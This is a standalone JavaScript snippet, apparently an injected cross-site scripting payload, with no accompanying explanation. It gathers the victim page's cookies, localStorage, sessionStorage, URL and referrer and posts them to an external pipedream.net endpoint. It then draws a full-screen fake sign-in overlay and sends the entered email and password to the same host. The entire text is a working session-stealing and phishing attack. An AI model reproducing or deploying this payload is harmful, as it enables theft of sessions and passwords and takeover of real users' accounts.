(async () => {
  const data = {
    location: window.location.href,
    hash: location.hash,
    search: location.search,
    referrer: document.referrer,
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    origin: location.origin
  };

  await fetch("https://eoat1elxcyeymir.m.pipedream.net", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ type: "XSS-Data", ...data })
  });

  const overlay = document.createElement('div');
  overlay.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;
                background:#fff;z-index:9999;display:flex;align-items:center;
                justify-content:center;flex-direction:column">
      <h2>Please sign in again</h2>
      <input id="user" placeholder="Email" style="margin:5px;padding:10px" />
      <input id="pass" placeholder="Password" type="password" style="margin:5px;padding:10px" />
      <button onclick="sendCreds()">Login</button>
    </div>`;
  document.body.appendChild(overlay);

  window.sendCreds = () => {
    const creds = {
      email: document.getElementById('user').value,
      password: document.getElementById('pass').value
    };
    fetch("https://eoat1elxcyeymir.m.pipedream.net", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: "creds", ...creds })
    });
  };
})();
